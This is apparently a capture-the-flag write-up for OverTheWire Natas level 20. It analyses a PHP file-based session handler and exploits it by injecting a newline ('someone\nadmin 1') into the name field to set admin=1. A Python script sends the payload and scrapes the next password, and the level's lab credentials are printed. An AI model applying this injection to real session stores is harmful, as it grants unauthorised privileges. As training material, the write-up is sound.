# Level 19 - Level 20

```
Username: natas20
Password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
URL:      http://natas20.natas.labs.overthewire.org
```

***

## Overview

This time we got an input field requesting for a name and a link to the source code. And its mentioned that, we have to login as admin to get the credentials for the next level.

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Source Code Analysis

Let's take a look at the source code and break it down.

<div>

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

</div>

The `debug` function prints messages that is passed to it, if there is parameter named `debug` in the  URL, i.e., [http://natas20.natas.labs.overthewire.org/?debug](http://natas20.natas.labs.overthewire.org/?debug).

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Next, let's take a look at the `print_credentials` function.&#x20;

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

The `print_credentials` function checks whether the key named `admin` exists in the array `$_SESSION` and if it exists, it also checks whether the value of the key `admin` is eqaul to 1.

If both of the above mentioned checks are passed, then it prints the credentials for the next level in the predefined format.

There are a few functions, which we can skip, since all of those functions just returns true.

<div align="center" data-full-width="false">

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

</div>

Before taking look at the `myread` function, let's take a look at the `mywrite` function.

The `mywrite` function, takes in two parameters, `$id` ( session id ) and `$data` ( name ). It first checks whether the given session id is valid and next it generates the `$filename`. It stores the data in the form of `"$key $value\n"` in a file in the path `$filename`.

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Next lets take a look at the `myread` function, which takes in the `$sid` as the parameter and checks whether the its a valid id and then generates a filename of format `/mysess_<$sid>`.

Then it reads the the contents of the filename that is generated above and stores it in a variable `$data`. Then it loops through each line of the variable `$data` and sets them as session variables. This `foreach` loop is vulenrable, since there is no proper input sanitization in the `mywrite`  function, which writes the data to the file.

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Let's break down the vulnerable `foreach` loop.

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

It uses the php `explode` function, which splits the given data based on the mentioned parameter, in this the parameter is `"\n"`. Then again it uses the same `explode` function for each iteration , which splits the data in the `$line` variable based on the parameter `" "`, which is then added to $\_SESSION as session variables.

For example, lets consider that the data in the file is `"name someone\nadmin 1"` and later retrieved and stored in the variable `$data = "name someone\nadmin 1"`. If the vulnerable `foreach` loop process this data, the variables that would be added to the session is:

```json
### The data won't be in the form of JSON. ###
### I have shown in JSON for easy understanding. ###
{
    "name": "someone",
    "admin": 1
}
```

***

## Exploiting the Vulnerability

Now we have explored all the functions in the source code. Now let's try to leverage the vulnerability we found. When we try to change the name, for the first time after the new session is created, we can see that it first checks for the session file and if it doesn't exists it writes the name that we give as input to the file using the `mywrite` function as `"name <input>\n"`

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Since there is no input validation, we can give the input as `'someone\nadmin 1'`, which will be read by the `myread` function as:

```json
### The data won't be in the form of JSON. ###
### I have shown in JSON for easy understanding. ###
{
    "name": "someone",
    "admin": 1
}
```

And since the data got the `admin: 1` value, for the next GET request to page with the same session id, the `print_credentials` function consider us as admin and will show the credentials.

***

## Getting the Password

To get the credentials, you can use the following python script which will extract the credentials for the next level from subsequent requests using the same session.

{% code lineNumbers="true" %}
```python
import requests
from requests.auth import HTTPBasicAuth
import re

session = requests.Session()

url = "http://natas20.natas.labs.overthewire.org/?debug"
username = "natas20"
password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

session.post(
    url,
    data={"name": 'someone\nadmin 1'},
    auth=HTTPBasicAuth(username, password),
)

response = session.get(
    url,
    auth=HTTPBasicAuth(username, password),
)

print(re.findall(r'Username:\snatas21', response.text)[0])
print(re.findall(r'Password:\s[A-Za-z\d]{32}', response.text)[0])
```
{% endcode %}

From running the above script, we got the credentials for the next level.

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
